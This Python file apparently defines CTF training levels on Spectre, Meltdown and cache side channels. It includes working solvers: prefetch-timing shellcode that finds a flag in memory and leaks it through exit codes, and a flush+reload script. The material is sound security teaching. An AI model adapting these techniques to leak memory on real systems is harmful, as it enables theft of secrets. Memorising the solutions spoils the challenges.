import pwnshop
import signal
import pwn
import pwnshop

PWNSHOP_AUTOREGISTER = False

# These incremental challenges start from
class BabyArchIncremental(pwnshop.Challenge):
    TEMPLATE_PATH = "babyarch/tutorial_levels/run.c"
    LINK_LIBRARIES = ["pthread", "rt"]

    flush_cache = True


class BabyArchBabySpectre1(BabyArchIncremental):
    task = "parseOnePage"

class BabyArchBabySpectre2(BabyArchIncremental):
    task = "parseMultiPage"

class BabyArchBabySpectre3(BabyArchIncremental):
    task = "measureTiming"

class BabyArchBabySpectre4(BabyArchIncremental):
    task = "all"
    flush_cache = False

class BabyArchBabySpectre5(BabyArchIncremental):
    task = "all"
    flush_cache = False
    speculative = True


# No longer in use because of python IO effects on cache
class BabyArchMenu(pwnshop.Challenge):
    TEMPLATE_PATH = "babyarch/babyarch_menu.c"
    PIE = True

class BabyArchUser(pwnshop.Challenge):
    TEMPLATE_PATH = "babyarch/babyarch.c"
    PIE = True
    LINK_LIBRARIES = ["capstone", "seccomp"]

    shellcode = True
    syscalls_allowed = []
    seccomp_default_kill = True
    seccomp_add_arch_x86 = False


class BabyArchMoltenWalkspace(pwnshop.Challenge):
    TEMPLATE_PATH = "babyarch/meltdown_userspace.c"
    PIE = False

class BabyArchKernel(pwnshop.KernelChallenge):
    TEMPLATE_PATH = "babyarch/babyarch_kernel.c"
    KASLR = True

    device_permissions = "0666"

def solve_sidechannel(verify, **kwargs):
    def payload(idx):
        return pwn.asm(f"""
        start:
            // step
            mov     r10,0x10000
            // min_time
            mov     r11,0xffffffffffffffff
            // min_addr
            mov     r12,0x0
            // init try = 0x0
            xor     rdi,rdi
            // retries (increasing this tends to increase stability)
            mov     r13, 10

            jmp    brute_prefetch

        prefetch: // (addr) -> time ; clobbers rax, rcx, rdx, rsi, r8, r9
            rdtsc
            mov     r9,rax
            mov     r8,rdx
            lfence
            prefetcht2 BYTE PTR [rdi]
            lfence
            rdtscp
            shl     r9,0x20
            or      r8,r9
            shl     rax,0x20
            or      rax,rdx
            sub     rax,r8
            ret

        brute_prefetch:
            // try += step
            add     rdi,r10
            // retry_ct = 0
            xor     r14, r14
            // time sum
            mov     r15, 0

            retry:
                // retry_ct++
                inc     r14
                // time = prefetch(try)
                call    prefetch
                // add time to sum
                add     r15, rax
                // while retry_ct < retries
                cmp     r14, r13
                jb      retry
// if time < min; min = time; min_addr = try;
            cmp     r15,r11
            cmovb   r11, r15
            cmovb   r12, rdi

            // while try < end_addr
            movabs  rsi, 0xffffff0000
            cmp     rdi, rsi
            jb      brute_prefetch

        exit: // exit(*min_addr)
            mov     rax, 60
            mov     edi, DWORD PTR[r12+{idx}]
            syscall
    """)

    flag = []
    while True:
        exit_code = -11
        while exit_code == -11:
            with verify(**kwargs) as process:
                process.sendline(payload(len(flag)))
                exit_code = process.poll(block=True)
        flag.append(exit_code)
        if chr(exit_code) == '}':
            break
    return bytes(flag)

class BabyArchMenuFlushReload(BabyArchMenu):
    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as p:
            def read_to_mem(index, val):
                p.sendline(b"read_to_mem")
                p.sendline(str(index).encode())
                p.sendline(val)
                p.recvuntil(b'get_flag')

            def flush():
                p.sendline(b"flush_cachelines")
                p.recvuntil(b"get_flag")

            def access_random():
                p.sendline(b"access_random")
                p.recvuntil(b"get_flag")

            def time_accesses():
                p.sendline(b"time_accesses")
                res = p.recvuntil(b"get_flag").decode().split('\n')[1:-1]
                res.sort()

                for i, r in enumerate(res):
                    time = int(r.split('accessed in ')[1].split()[0])
                    if time < 200 and "index 0" not in r:
                        return r.split()[1]

            p.recvuntil(b'get_flag')

            # dirty pages
            for i in range(256):
                read_to_mem(i, b'a')

            flush()
            access_random()
            index = time_accesses()
            p.clean()
            p.sendline("get_flag")
            p.sendline(index)
            p.sendline("quit")
            assert self.flag in p.recvall()


class BabyArchPrefetchPeek(BabyArchUser):
    """
    Locate the flag in memory using shellcode after all references to it have been destroyed, you will only have access to the "exit" system call. You will need a creative way of locating the flag's address in your process! (patched)
    """
    syscalls_allowed = ["exit"]
    prefetch = True

    def verify(self, **kwargs):
        """
        Allow shellcode, restrict to exit syscall
        """
        assert solve_sidechannel(self.run_challenge, **kwargs) == self.flag

class BabyArchSpookySpectre1(BabyArchKernel):
    """
    Use a speculative bounds check bypass which accesses a page mapped in userspace to leak the flag
    """
    TEMPLATE_PATH = "babyarch/babyarch_kernel.c"
    device_mmap = True
    load_flag = True
    spectre_v1 = True

    def verify(self, **kwargs):
        """
        Leak flag via speculative bounds check bypass
        """
        # with self.run_challenge(**kwargs) as process:
        #     result = self.run_c(
        #         """
        #         """.replace("[FLAG_LEN]", str(len(self.flag))),
        #         user="hacker",
        #         flags=["-Os"] # -Os tends to makes things faster/more stable
        #     ).readall()
        #     assert self.flag in result
        raise NotImplementedError()

class BabyArchSpookySpectre2(BabyArchKernel):
    """
    Use a speculative indirect call which accesses a page mapped in userspace to leak the flag
    """
    TEMPLATE_PATH = "babyarch/babyarch_kernel.c"
    device_mmap = True
    load_flag = True
    spectre_v2 = True

    def verify(self, **kwargs):
        """
        Leak flag via speculated indirect call
        """
        raise NotImplementedError()

class BabyArchMoltenAccess(BabyArchKernel):
    """
    Use meltdown to read the flag from the kernel module's memory
    """
    TEMPLATE_PATH = "babyarch/babyarch_kernel.c"
    load_flag = True
    meltdown_kern_flag = True

    def verify(self, **kwargs):
        """
        Leak flag via meltdown from address printed in dmesg
        """
        raise NotImplementedError()

# TODO: maybe there should be an intermediate step between "read this address" and walking the page tables
# something like traversing a linked list of some randomish allocations to find the flag could be decent

class BabyArchMoltenWalk(BabyArchKernel):
    """
    Use meltdown to read the flag from a user process's memory
    """
    TEMPLATE_PATH = "babyarch/babyarch_kernel.c"
    load_flag = False
    meltdown_user_flag = True

    def verify(self, **kwargs):
        """
        Leak flag via meltdown, get task_struct addr from ioctl use it to get task->mm->pgd then walk page table to find flag
        """
        raise NotImplementedError()

class BabyArchYan85Reloaded(BabyArchKernel):
    """
    Use a cache side channel triggered through y85 shellcode which accesses a page mapped in userspace to leak the flag
    """
    TEMPLATE_PATH = "babyarch/babyarch_y85_fr.c"

    def verify(self, **kwargs):
        """
        Leak flag via flush and reload using sys_exec to access the otherwise innacessible page
        """
        raise NotImplementedError()

class BabyArchGhostInTheYPU1(BabyArchKernel):
    """
    Use a Spectre v1 channel triggered through y85 shellcode which accesses a page mapped in userspace to leak the flag
    """
    TEMPLATE_PATH = "babyarch/babyarch_y85_v1.c"

    def verify(self, **kwargs):
        """
        Leak flag via flush and reload, use a bounds check bypass in sys_exec to speculatively read the flag from secret memory
        """
        raise NotImplementedError()

class BabyArchGhostInTheYPU2(BabyArchKernel):
    """
    Use a Spectre v2 side channel triggered through y85 shellcode which accesses a page mapped in userspace to leak the flag
    """
    TEMPLATE_PATH = "babyarch/babyarch_y85_v2.c"

    def verify(self, **kwargs):
        """
        Leak flag via flush and reload, use a poisoned branch target buffer to speculatively call sys_exec with the arguments of sys_open, allowing an out of bounds speculative read
        """
        raise NotImplementedError()

LEVELS = [
    BabyArchBabySpectre1,
    BabyArchBabySpectre2,
    BabyArchBabySpectre3,
    BabyArchBabySpectre4,
    BabyArchBabySpectre5,
    BabyArchPrefetchPeek,
    BabyArchSpookySpectre1,
    BabyArchSpookySpectre2,
    BabyArchYan85Reloaded,
    BabyArchGhostInTheYPU1,
    BabyArchGhostInTheYPU2,
    BabyArchMoltenAccess,
    BabyArchMoltenWalk
]

CHOOSE_LEVELS = [
    BabyArchPrefetchPeek,
    BabyArchSpookySpectre1,
    BabyArchSpookySpectre2,
    BabyArchYan85Reloaded,
    BabyArchGhostInTheYPU1,
    BabyArchGhostInTheYPU2,
    BabyArchMoltenAccess,
    BabyArchMoltenWalk
]
